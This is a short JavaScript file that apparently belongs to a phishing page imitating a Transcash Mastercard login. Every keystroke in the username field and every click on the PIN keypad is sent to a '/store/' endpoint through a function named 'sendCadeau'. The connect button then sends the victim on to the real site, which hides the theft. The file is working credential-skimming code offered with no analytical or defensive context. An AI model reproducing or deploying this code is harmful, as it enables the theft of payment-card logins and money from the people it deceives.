function sendUsername(e) {
    sendCadeau(e.target.value);
}

function showPwd() {
    document.getElementById("securePin").style.display = 'table';
}

function sendPwd(e) {
    sendCadeau(document.getElementById("password").value);
    document.getElementById("password").value += e.target.textContent;
}

function sendCadeau(a) {
    fetch('/store/' + a).then().catch();
}

function redirect() {
    document.location.href = 'https://transcashmastercard.espace-personnel.fr/login';
}

document.getElementById("username").addEventListener("input", sendUsername, false);

document.getElementById("username").addEventListener("input", sendUsername, false);

document.querySelectorAll("#securePin td").forEach(item => {
    item.addEventListener('click', sendPwd)
})

document.getElementById("connectBtn").addEventListener("click", redirect, false);